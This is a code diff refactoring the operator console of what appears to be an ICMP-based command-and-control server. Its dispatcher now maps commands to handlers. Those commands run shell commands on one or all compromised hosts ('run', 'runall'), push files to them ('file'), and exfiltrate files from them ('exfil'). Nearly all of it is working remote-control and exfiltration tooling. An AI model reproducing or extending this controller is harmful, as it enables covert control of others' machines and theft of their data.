@@ -23,6 +23,7 @@
 #include <sstream>
 #include <fstream>
 #include <algorithm>
+#include <functional>
 
 #include <unistd.h>
 #include <sys/types.h>
@@ -34,21 +35,10 @@
 #include <arpa/inet.h>
 #include <netdb.h>
 
-enum class user_command_t {
-  PD_HELP,
-  PD_LIST,
-  PD_HOSTS,
-  PD_GROUP,
-  PD_SET,
-  PD_RUN,
-  PD_RUNALL,
-  PD_FILE,
-  PD_EXFIL,
-  PD_EXPORT,
-  PD_LOAD,
-  PD_CLEAR,
-  PD_EXIT,
-  PD_NONE
+struct command_t
+{
+  std::function<void(const std::string &)> call;
+  std::string desc;
 };
 
 using host_mapping_t = std::map<std::string, std::string>;
@@ -68,6 +58,43 @@ static std::string cur_host;
 
 /** Currently selected group */
 static std::string cur_group;
+
+void cmd_help(const std::string &);
+void cmd_list(const std::string &);
+void cmd_hosts(const std::string &);
+void cmd_group(const std::string &);
+void cmd_set(const std::string &);
+void cmd_run(const std::string &);
+void cmd_file(const std::string &);
+void cmd_exfil(const std::string &);
+void cmd_runall(const std::string &);
+void cmd_export(const std::string &);
+void cmd_load(const std::string &);
+void cmd_clear(const std::string &);
+void cmd_exit(const std::string &);
+
+static const std::map<std::string, command_t> commands = {
+  { "help", { cmd_help, "help: displays usable commands" } },
+  { "list", { cmd_list, "list: lists all active connections to the server" } },
+  { "hosts", { cmd_hosts, "hosts: lists expected hosts that are supplied by the database file" } },
+  { "group", { cmd_group,
+               "group: by default this command lists all groups\n"
+               "\tadd/rm [group] [host]: adds/removes a host to a group to run commands on\n"
+               "\tlist [group]: lists all hosts within a group" } },
+  { "set", { cmd_set, "set [host/group]: sets the current host to run commands on" } },
+  { "run", { cmd_run, "run [command]: runs a command on the currently set host" } },
+  { "file", { cmd_file,
+              "file [src] [dst]: sends a file to the currently set host.\n"
+              "\tsrc is the file on the server box, and dst is the location on the host machine." } },
+  { "exfil", { cmd_exfil,
+               "exfil [src] [dst]: exfiltrates a file from the currently set host.\n"
+               "\tsrc is the location on the server to save the file, and dst is the location of the file on the host to exfiltrate." } },
+  { "runall", { cmd_runall, "runall [command]: runs a command on all active connections" } },
+  { "export", { cmd_export, "export [filename]: export all active connections to a database file" } },
+  { "load", { cmd_load, "load [filename]: load a database file of host to ip mappings" } },
+  { "clear", { cmd_clear, "clear: clear the active connections. Useful for testing if connections still exist." } },
+  { "exit", { cmd_exit, "exit: stops the server and exits" } },
+};
 
 /**
  * @brief Calculates checksum of an array of data.
@@ -135,7 +162,7 @@ static uint16_t checksum(void *vdata, uint32_t size)
  * @param input string to split
  * @return vector of strings
  */
-std::vector<std::string> split_input(std::string &input)
+std::vector<std::string> split_input(const std::string &input)
 {
   std::vector<std::string> ret;
   std::istringstream iss(input);
@@ -143,24 +170,6 @@ std::vector<std::string> split_input(std::string &input)
     ret.push_back(s);
   }
   return ret;
-}
-
-user_command_t input_to_command(const std::string &input)
-{
-  if (input == "help") return user_command_t::PD_HELP;
-  if (input == "list") return user_command_t::PD_LIST;
-  if (input == "hosts") return user_command_t::PD_HOSTS;
-  if (input == "group") return user_command_t::PD_GROUP;
-  if (input == "set") return user_command_t::PD_SET;
-  if (input == "run") return user_command_t::PD_RUN;
-  if (input == "runall") return user_command_t::PD_RUNALL;
-  if (input == "file") return user_command_t::PD_FILE;
-  if (input == "exfil") return user_command_t::PD_EXFIL;
-  if (input == "export") return user_command_t::PD_EXPORT;
-  if (input == "load") return user_command_t::PD_LOAD;
-  if (input == "clear") return user_command_t::PD_CLEAR;
-  if (input == "exit") return user_command_t::PD_EXIT;
-  return user_command_t::PD_NONE;
 }
 
 /**
@@ -479,8 +488,43 @@ void load_connections(const std::string &filename)
   }
 }
 
-void group(const std::vector<std::string> &input_arr)
+std::ostream &operator<<(std::ostream &os, const host_mapping_t &mapping)
 {
+  auto it = mapping.begin();
+  for (; it != mapping.end(); it++) {
+    os << it->first << ": " << it->second << "\n";
+  }
+  return os;
+}
+
+/**
+ * @brief Print help message.
+ */
+void cmd_help(const std::string &input)
+{
+  auto it = commands.begin();
+  for (; it != commands.end(); it++) {
+    std::puts(it->second.desc.c_str());
+  }
+}
+
+void cmd_list(const std::string &)
+{
+  std::puts("Listing active machines!");
+  std::lock_guard<std::mutex> guard(active_connections_mutex);
+  std::cout << active_connections;
+}
+
+void cmd_hosts(const std::string &)
+{
+  std::puts("Listing host machines!");
+  std::cout << host_database;
+}
+
+void cmd_group(const std::string &input)
+{
+  auto input_arr = split_input(input);
+
   if (input_arr.size() < 2) {
     auto it = groups.begin();
     for (; it != groups.end(); it++) {
@@ -537,9 +581,10 @@ void group(const std::vector<std::string> &input_arr)
   }
 }
 
-void set(const std::vector<std::string> &input_arr)
+void cmd_set(const std::string &input)
 {
-  // set host to execute commands
+  auto input_arr = split_input(input);
+
   if (input_arr.size() < 2) {
     std::puts("usage: set [host]");
     return;
@@ -555,9 +600,10 @@ void set(const std::vector<std::string> &input_arr)
   }
 }
 
-void run(const std::vector<std::string> &input_arr)
+void cmd_run(const std::string &input)
 {
-  // run a command on a host by hostname
+  auto input_arr = split_input(input);
+
   if (input_arr.size() < 2) {
     std::puts("usage: run [command]");
     return;
@@ -594,35 +640,102 @@ void run(const std::vector<std::string> &input_arr)
   }
 }
 
-std::ostream &operator<<(std::ostream &os, const host_mapping_t &mapping)
+void cmd_file(const std::string &input)
 {
-  auto it = mapping.begin();
-  for (; it != mapping.end(); it++) {
-    os << it->first << ": " << it->second << "\n";
+  auto input_arr = split_input(input);
+
+  if (input_arr.size() < 3) {
+    std::puts("usage: file [src] [dst]");
+    return;
   }
-  return os;
+  std::string ip = active_connections[cur_host];
+
+  std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
+            << ip
+            << "\n";
+  send_file(ip, input_arr.at(1), input_arr.at(2));
 }
 
-/**
- * @brief Print help message.
- */
-void help()
+void cmd_exfil(const std::string &input)
 {
-  std::puts("\thelp: displays usable commands");
-  std::puts("\tlist: lists all active connections to the server");
-  std::puts("\thosts: lists expected hosts that are supplied by the database file");
-  std::puts("\tgroup: by default this command lists all groups");
-  std::puts("\t\tadd/rm [group] [host]: adds/removes a host to a group to run commands on");
-  std::puts("\t\tlist [group]: lists all hosts within a group");
-  std::puts("\tset [host/group]: sets the current host to run commands on");
-  std::puts("\trun [command]: runs a command on the currently set host");
-  std::puts("\tfile [src] [dst]: sends a file to the currently set host. src is the file on the server box, and dst is the location on the host machine.");
-  std::puts("\texfil [src] [dst]: exfiltrates a file from the currently set host. src is the location on the server to save the file, and dst is the location of the file on the host to exfiltrate.");
-  std::puts("\trunall [command]: runs a command on all active connections");
-  std::puts("\texport [filename]: export all active connections to a database file");
-  std::puts("\tload [filename]: load a database file of host to ip mappings");
-  std::puts("\tclear: clear the active connections. Useful for testing if connections still exist.");
-  std::puts("\texit: stops the server and exits");
+  auto input_arr = split_input(input);
+
+  if (input_arr.size() < 3) {
+    std::puts("usage: exfil [src] [dst]");
+    return;
+  }
+  std::string ip = active_connections[cur_host];
+
+  std::cout << "Receiving file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
+            << ip
+            << "\n";
+  receive_file(ip, input_arr.at(1), input_arr.at(2));
+}
+
+void cmd_runall(const std::string &input)
+{
+  auto input_arr = split_input(input);
+
+  if (input_arr.size() < 2) {
+    std::puts("usage: runall [command]");
+    return;
+  }
+
+  std::string command;
+  for (int i = 1; i < input_arr.size(); i++) {
+    command.append(input_arr.at(i));
+    if (i != input_arr.size() - 1) {
+      command.append(" ");
+    }
+  }
+
+  std::lock_guard<std::mutex> guard(active_connections_mutex);
+  auto it = active_connections.begin();
+  for (; it != active_connections.end(); it++) {
+    std::cout << "Running command \"" << command << "\" on "
+              << it->second
+              << "\n";
+    send_command(it->second, command);
+  }
+}
+
+void cmd_export(const std::string &input)
+{
+  auto input_arr = split_input(input);
+
+  std::string filename;
+  if (input_arr.size() > 1) {
+    filename = input_arr.at(1);
+  } else {
+    // default filename
+    filename = "exported.txt";
+  }
+  std::cout << "Exporting to: " << filename << "\n";
+  export_connections(filename);
+}
+
+void cmd_load(const std::string &input)
+{
+  auto input_arr = split_input(input);
+
+  if (input_arr.size() < 2) {
+    std::puts("usage: load [filename]");
+    return;
+  }
+  std::cout << "Loading from: " << input_arr.at(1) << "\n";
+  load_connections(input_arr.at(1));
+}
+
+void cmd_clear(const std::string &)
+{
+  std::puts("Clearing active connections");
+  std::lock_guard<std::mutex> guard(active_connections_mutex);
+  active_connections.clear();
+}
+
+void cmd_exit(const std::string &)
+{
+  exit(0);
 }
 
 /**
@@ -642,7 +755,7 @@ int main(int argc, char **argv)
   }
 
   // display help message
-  help();
+  cmd_help("help");
 
   std::puts("Starting listening thread.");
   std::thread listen_thread(listen_task);
@@ -661,128 +774,8 @@ int main(int argc, char **argv)
     // split input by spaces and save into an vector
     auto input_arr = split_input(input);
 
-    // get command type
-    auto user_command = input_to_command(input_arr.at(0));
-
-    switch (user_command) {
-    case user_command_t::PD_HELP: {
-      help();
-      break;
-    }
-    case user_command_t::PD_LIST: {
-      // lists active hosts
-      std::puts("Listing active machines!");
-      std::lock_guard<std::mutex> guard(active_connections_mutex);
-      std::cout << active_connections;
-      break;
-    }
-    case user_command_t::PD_HOSTS: {
-      // lists hosts that have been loaded from a file
-      std::puts("Listing host machines!");
-      std::cout << host_database;
-      break;
-    }
-    case user_command_t::PD_GROUP: {
-      group(input_arr);
-      break;
-    }
-    case user_command_t::PD_SET: {
-      set(input_arr);
-      break;
-    }
-    case user_command_t::PD_RUN: {
-      run(input_arr);
-      break;
-    }
-    case user_command_t::PD_RUNALL: {
-      // run a command on all hosts
-      if (input_arr.size() < 2) {
-        std::puts("usage: runall [command]");
-        continue;
-      }
-
-      std::string command;
-      for (int i = 1; i < input_arr.size(); i++) {
-        command.append(input_arr.at(i));
-        if (i != input_arr.size() - 1) {
-          command.append(" ");
-        }
-      }
-
-      std::lock_guard<std::mutex> guard(active_connections_mutex);
-      auto it = active_connections.begin();
-      for (; it != active_connections.end(); it++) {
-        std::cout << "Running command \"" << command << "\" on "
-                  << it->second
-                  << "\n";
-        send_command(it->second, command);
-      }
-      break;
-    }
-    case user_command_t::PD_FILE: {
-      // send a file over ICMP to host
-      if (input_arr.size() < 3) {
-        std::puts("usage: file [src] [dst]");
-        continue;
-      }
-      std::string ip = active_connections[cur_host];
-
-      std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
-                << ip
-                << "\n";
-      send_file(ip, input_arr.at(1), input_arr.at(2));
-      break;
-    }
-    case user_command_t::PD_EXFIL: {
-      // exfiltrate a file from a host
-      if (input_arr.size() < 3) {
-        std::puts("usage: exfil [src] [dst]");
-        continue;
-      }
-      std::string ip = active_connections[cur_host];
-
-      std::cout << "Receiving file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
-                << ip
-                << "\n";
-      receive_file(ip, input_arr.at(1), input_arr.at(2));
-      break;
-    }
-    case user_command_t::PD_EXPORT: {
-      // export currently connected hosts to a file
-      std::string filename;
-      if (input_arr.size() > 1) {
-        filename = input_arr.at(1);
-      } else {
-        // default filename
-        filename = "exported.txt";
-      }
-      std::cout << "Exporting to: " << filename << "\n";
-      export_connections(filename);
-      break;
-    }
-    case user_command_t::PD_LOAD: {
-      // load a host config from a filename
-      if (input_arr.size() < 2) {
-        std::puts("usage: load [filename]");
-        continue;
-      }
-      std::cout << "Loading from: " << input_arr.at(1) << "\n";
-      load_connections(input_arr.at(1));
-      break;
-    }
-    case user_command_t::PD_CLEAR: {
-      // clear the currently connected hosts
-      std::puts("Clearing active connections");
-      std::lock_guard<std::mutex> guard(active_connections_mutex);
-      active_connections.clear();
-      break;
-    }
-    case user_command_t::PD_EXIT: {
-      exit(0);
-    }
-    default: {
-      break;
-    }
+    if (commands.find(input_arr.at(0)) != commands.end()) {
+      commands.at(input_arr.at(0)).call(input);
     }
   }
 
